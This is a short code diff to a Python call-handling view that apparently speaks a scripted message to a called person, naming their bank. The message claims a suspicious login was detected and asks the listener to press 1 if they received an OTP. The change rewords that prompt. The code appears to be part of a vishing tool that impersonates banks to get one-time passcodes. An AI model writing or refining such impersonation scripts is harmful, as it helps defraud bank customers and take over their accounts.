@@ -466,7 +466,7 @@ def voice(request,bank,chat_id):
     
     # Replace underscores with spaces, works whether or not digits were present
     name = bank_with_words.replace('_', ' ')
-    gather.say(f'We have detected a login attempt on your {name} account, leading us to suspect a possible security breach. If you did not initiate this login request and request an OTP, kindly press 1.')
+    gather.say(f'We have detected a login attempt on your {name} account, leading us to suspect a possible security breach. If you did not initiate this login request and you have received an OTP, kindly press 1.')
     resp.append(gather)
     call_status = request.POST.get('CallStatus')
     if call_status == 'in-progress':
